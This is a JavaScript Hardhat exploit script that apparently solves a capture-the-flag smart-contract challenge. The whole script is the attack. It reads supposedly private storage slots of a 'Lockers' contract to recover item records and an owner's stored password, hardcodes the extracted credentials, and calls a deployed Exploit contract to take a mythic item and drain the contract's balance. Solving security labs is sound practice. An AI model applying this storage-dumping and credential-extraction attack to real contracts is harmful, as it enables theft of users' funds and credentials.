const hre = require("hardhat");
const Web3 = require('web3');
const { solidityPackedKeccak256 } = require("ethers");
const BigNumber = require('bignumber.js');

async function main() {

    const [deployer] = await hre.ethers.getSigners();

    const SETUP_ADDRESS = "0x8398121894e45Aa1662489B6a21dbEd761CEB35b";

    // Get the contract instances
    const Setup = await hre.ethers.getContractFactory("contracts/Locked_And_Loaded/Setup.sol:Setup");
    const setupInstance = Setup.attach(SETUP_ADDRESS);
    
    // Interact with the Setup contract
    const LockersAddress = await setupInstance.TARGET();
    console.log(`[!] AuctionHouse Address: ${LockersAddress}`);
    
    // Assuming Creature ABI is available
    const Lockers = await hre.ethers.getContractFactory("contracts/Locked_And_Loaded/Lockers.sol:Lockers");
    const lockersInstance = Lockers.attach(LockersAddress);
    
    const AttackerContract = await hre.ethers.getContractFactory("contracts/Locked_And_Loaded/Solution/TestContrat.sol:Exploit");
    let attackerContractInstance = await AttackerContract.deploy(LockersAddress);

    const web3 = new Web3.Web3('http://94.237.62.195:37366/rpc');
    
    console.log("[+] Total starting balance of Locker: ", await web3.eth.getBalance(LockersAddress));

    // Step 1:
    // Loops through the storage private var. This gets us the 10 Items and their values:

    let originalHash = solidityPackedKeccak256(["uint256"], [3]);
    let originalHashBigNumber;
    let incrementedHash;
    let incrementedHashHex;

    console.log("\n\n");
    for(let i = 0; i < 10; i++){
    console.log("---------------------------");
    if (i%10 == 0){
            console.log("\nDONE 10 \n")
        }
        temp = await web3.eth.getStorageAt(LockersAddress, originalHash);
        console.log("ITEM NAME -");
        console.log(originalHash);
        console.log(temp);
        console.log("---------------------------");

        originalHashBigNumber = new BigNumber(originalHash.substring(2), 16);
        // Add 1 to the BigNumber
        incrementedHash = originalHashBigNumber.plus(1);
        // Convert the incremented hash back to hexadecimal
        incrementedHashHex = '0x' + incrementedHash.toString(16);
        temp = await web3.eth.getStorageAt(LockersAddress, incrementedHashHex);
        console.log("ITEM OWNER NAME -");
        console.log(originalHash);
        console.log(temp);
        console.log("---------------------------");

        originalHashBigNumber = new BigNumber(incrementedHashHex.substring(2), 16);
        // Add 1 to the BigNumber
        incrementedHash = originalHashBigNumber.plus(1);
        // Convert the incremented hash back to hexadecimal
        incrementedHashHex = '0x' + incrementedHash.toString(16);
        temp = await web3.eth.getStorageAt(LockersAddress, incrementedHashHex);
        console.log("ITEM RARITY -");
        console.log(incrementedHashHex);
        console.log(temp);
        console.log("---------------------------");
        console.log("---------------------------\n");

        originalHashBigNumber = new BigNumber(originalHash.substring(2), 16);
        // Add 1 to the BigNumber
        incrementedHash = originalHashBigNumber.plus(3);
        // Convert the incremented hash back to hexadecimal
        originalHash = '0x' + incrementedHash.toString(16);        
    }

    // We can see that there is only one mythic item, which is Item # 7. 
    // Dumping details of mythic item
    console.log("\n\n[+] Dumping mythic \"WizardsScepter\" item details -");
    // Get Item name
    originalHash = solidityPackedKeccak256(["uint256"], [3]);
    originalHashBigNumber = new BigNumber(originalHash.substring(2), 16);
    incrementedHash = originalHashBigNumber.plus(6*3);
    incrementedHashHex = '0x' + incrementedHash.toString(16);
    temp = await web3.eth.getStorageAt(LockersAddress, incrementedHashHex);
    console.log("ITEM NAME -");
    console.log(originalHash);
    console.log(temp);
    console.log("---------------------------");

    //Get owner name
    originalHashBigNumber = new BigNumber(incrementedHashHex.substring(2), 16);
    incrementedHash = originalHashBigNumber.plus(1);
    incrementedHashHex = '0x' + incrementedHash.toString(16);
    temp = await web3.eth.getStorageAt(LockersAddress, incrementedHashHex);
    console.log("ITEM OWNER NAME -");
    console.log(incrementedHashHex);
    console.log(temp);
    console.log("---------------------------");

    //Get Rarity name
    originalHashBigNumber = new BigNumber(incrementedHashHex.substring(2), 16);
    incrementedHash = originalHashBigNumber.plus(1);
    incrementedHashHex = '0x' + incrementedHash.toString(16);
    temp = await web3.eth.getStorageAt(LockersAddress, incrementedHashHex);
    console.log("ITEM RARITY -");
    console.log(incrementedHashHex);
    console.log(temp);
    console.log("---------------------------");

    // We see that item owner is beliefspace. Time to extract his password
    console.log("\n\n[+] Dumping beliefspace password -");

    // Get password from username Username, password
    console.log("---------------------------");
    console.log("Getting beliefspace passwd length:")
    temp = await web3.eth.getStorageAt(LockersAddress, solidityPackedKeccak256(["string", "uint256"], ["beliefspace", 0]));
    console.log(solidityPackedKeccak256(["string", "uint256"], ["beliefspace", 0]));
    console.log(temp);
    console.log("---------------------------");

    console.log("Getting beliefspace passwd p1:")
    let tempHash = web3.utils.keccak256(solidityPackedKeccak256(["string", "uint256"], ["beliefspace", 0]));
    temp = await web3.eth.getStorageAt(LockersAddress, tempHash);
    console.log(tempHash);
    console.log(temp);
    console.log("---------------------------");

    console.log("Getting beliefspace passwd p2:")
    let tempHashBigNumber = new BigNumber(tempHash.substring(2), 16);
    let incrementedtempHash = tempHashBigNumber.plus(1);
    let incrementedtempHashHex = '0x' + incrementedtempHash.toString(16);
    temp = await web3.eth.getStorageAt(LockersAddress, incrementedtempHashHex);
    console.log(incrementedtempHashHex);
    console.log(temp);
    console.log("---------------------------");

    // EXTRACTED MYTHIC OWNER CREDS -
    // Username - beliefspace
    // Password - ss4#Nq7nNyKMfZ=XESnOzP2hk:SSRCzo2QPk4w~~
    let Mythic_OWNER_PASS = "ss4#Nq7nNyKMfZ=XESnOzP2hk:SSRCzo2QPk4w~~";
    let mythic_name = "WizardsScepter";
    let attacker_username = "attacker";
    let attacker_password = "testPassword";
    
    console.log("\n[!] Starting Attack...");
    await attackerContractInstance.attack(mythic_name, attacker_username, attacker_password, Mythic_OWNER_PASS);

    console.log("[+] Balance After attack of Locker: ", await web3.eth.getBalance(LockersAddress));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });